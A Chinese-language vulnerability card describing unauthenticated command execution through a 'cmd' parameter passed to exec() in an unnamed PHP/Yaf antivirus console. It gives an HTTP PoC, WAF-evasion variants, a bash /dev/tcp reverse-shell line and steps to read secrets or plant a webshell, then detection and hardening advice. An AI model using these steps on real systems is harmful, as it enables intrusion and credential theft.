---
id: web-php-rce-esm-console-page-controller-cmd-exec
title: 防病毒管控台 PageController 无鉴权 cmd 参数 exec 直接命令执行并回显
type: scenario
domain: web
path: web/php/rce
technique: php-exec-param-command-execution
aliases:
- cmdAction 命令执行
- Yaf ApiController 无鉴权 RCE
- exec 参数直通
- 管控台后门控制器
tags:
- php
- yaf
- rce
- command-injection
- exec
- enterprise-console
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-15
  verified_at: '2026-11-08T08:02:59+08:00'
  notes: 已对照原文核对。14 张图全部查看：图11 代码显示 PageController extends ApiController，cmdAction 中 cmd=param('cmd')→exec(cmd,&output)→ok(output)；图04 ApiController::init 仅 disableView+取 request，无会话校验；图02/03 对比 MyController 的 session 校验与白名单可见 PageController 不在白名单但走无鉴权体系。图12 POST /index body cmd=ifconfig，请求无 Cookie，响应 200 且 data 数组含完整 eth0/lo/utun 输出，未认证命令执行与回显已打通。原文未给产品名与版本号（仅称某企业终端防病毒系统且声明已打补丁），affected_versions 保持为空。未验证点：未确认该控制器在真实补丁前后是否存在、未复跑；dbAction 的 SQL 拼接仅代码露出无 PoC，卡内仅作变体记录，处理正确。次要问题：卡内关联 [[web-generic-auth-esm-console-unauth-register-auto-login]] 指向已 reject 卡、实际不存在，应改指 web-generic-auth-unauth-user-create-admin-takeover，建议后续修正，不影响本条判定。
---

## 一句话结论

PHP（Yaf）架构的终端防病毒管控台里，`PageController` 继承不校验会话的 `ApiController`，其 `cmdAction` 把请求参数 `cmd` 原样交给 `exec()` 并把输出数组返回，未登录即可在服务器上执行任意系统命令并直接看到回显。

## 原理

- **入口无鉴权**：`ApiController::init()` 只做 `Yaf_Dispatcher::getInstance()->disableView()` 与取 request，不检查 `$_SESSION['UserInfo']`；继承它的 `PageController` 因此对所有请求开放。
- **参数直通 exec**：`cmdAction` 中 `$cmd = $this->param('cmd', '')`，随后 `exec($cmd, &$output)`；`param()` 只做 `trim()` 与类型判断，不做任何 shell 元字符过滤。`exec()` 走 `/bin/sh -c`，因此分号、管道、反引号、`$()` 全部生效。
- **回显闭环**：`exec` 的第二个参数收集每行输出到 `$output`，随后 `$this->ok($output)` 以 JSON 返回，等于自带命令回显，不需要带外通道。
- **权限**：进程以 Web 服务账号（nginx/php-fpm 运行用户，常为 www-data/nginx/apache）执行，可直接读配置（数据库口令、会话密钥），再横向到数据库或其它节点。
- **性质**：`PageController` 在原文里被直接称为"后门控制器"，即产品本身预留的调试/运维接口，未做任何访问控制，这类接口在商业设备与管控平台中常见。

## 触发条件

- 目标为该 PHP/Yaf 管控台且 `PageController` 未被移除或加鉴权。
- Web 入口可达（Yaf 单入口，动作 `cmdAction`），且 `exec` 未被 `disable_functions` 禁用。
- 无需任何会话或凭据。

## 利用步骤

1. 探测入口：向单入口提交 `cmd=id`，观察 JSON 中 `data` 数组是否返回命令输出。
2. 若被 WAF 拦关键词，改用 `$()`、反引号、`${IFS}`、拼接（`c'a't /etc/passwd`）等方式变形。
3. 读敏感配置（数据库连接、密钥）与主机信息，确认 Web 用户权限。
4. 需要稳定会话时，用 `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` 或写 webshell 到可写目录（本系统另有 `uploadAction`）。

## PoC

```http
POST /index HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cmd=ifconfig
```

```json
{"r":"","code":0,"action":0,"msg":"","data":["eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500","        inet 10.211.55.6  netmask 255.255.255.0  broadcast 10.211.55.255", "..."]}
```

## 变体与关联

- 变体：同一控制器的 `dbAction` 还把 `$table/$field/$where` 拼进 `SELECT` 交给 `DBLogs::getAll`/`cascade::getAll`，具备 SQL 注入面（原文未展开验证，仅记录）。
- 变体：若 `exec` 被禁用，可改走 `system`/`passthru`/`popen`/`proc_open` 或文件写入 + 包含。
- 关联：[[web-generic-file-upload-esm-console-path-param-mv-command-injection]]（同一控制器体系的未鉴权上传与 `mv` 拼接注入）、[[web-generic-auth-esm-console-unauth-register-auto-login]]（同系统的未鉴权注册）。
- 边界：原文为闭源商业产品，未给版本号；设备若已打补丁则该控制器可能已加鉴权或被移除。

## 检测与防御

- 防御：删除或加鉴权所有调试/运维控制器；禁止把请求参数直接交给 `exec/system/passthru`，必须走参数化命令或白名单。
- 加固：`disable_functions` 关闭 `exec/system/passthru/shell_exec/popen/proc_open`；Web 进程降权并限制可执行目录；管理面只在内网/堡垒机暴露。
- 检测：请求参数中出现 shell 元字符（`;`、`|`、`$(`、反引号）且路由为运维类 action；Web 进程派生 `sh/bash`、`ifconfig/id/whoami` 等侦察命令；响应体中出现命令输出特征。
